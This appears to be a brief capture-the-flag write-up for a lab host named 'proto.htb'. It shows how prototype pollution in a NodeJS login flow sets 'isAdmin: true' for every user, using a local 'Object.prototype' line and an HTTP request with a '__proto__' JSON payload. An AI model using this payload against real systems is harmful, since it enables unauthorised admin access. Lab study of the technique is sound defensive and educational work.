In your example we have a NodeJS application with a portal where we want to gain access to the Admin portal but.

1)By default all new users are no given the admin role = no party
2)We can't tamper the JWT token since we do not have the secret key to pass the signing
We know that the registered users are no priv access:
```
Database.create = async () => {
    try {
        await Database.Users.sync({ force: true });
        await Database.Users.create({
            username: "admin",
            password: bcrypt.hashSync(adminPassword, 10),
            isAdmin: true,
        });
    } catch (error) {
        console.error("Error creating table:", error);
    }
};
```

## How to bypass
Here we have 2 possible ways to bypass the login and in both cases is using the prototype pollution so the **IsAdmin:true** will be polluted all the way back to all the methods that inherit from same prototypes...

1)If you have local access to the code(testing only)
```
Object.prototype.isAdmin = true;
```
(All users will auto inherit the new property from the default prototype)

2)Externally(Black-box)
Register a new user on the site(IMPORTANT: as pollution might kill the register functionality.)
```
POST /login HTTP/1.1
Host: proto.htb
Content-Length: 77
Content-Type: application/json

{
"username":"test", "password": "test",
  "__proto__":{
    "isAdmin":true
  }
}
```
3)Upon login all the users will inherit the **isAdmin: true** and bypass the /admin restriction on the page!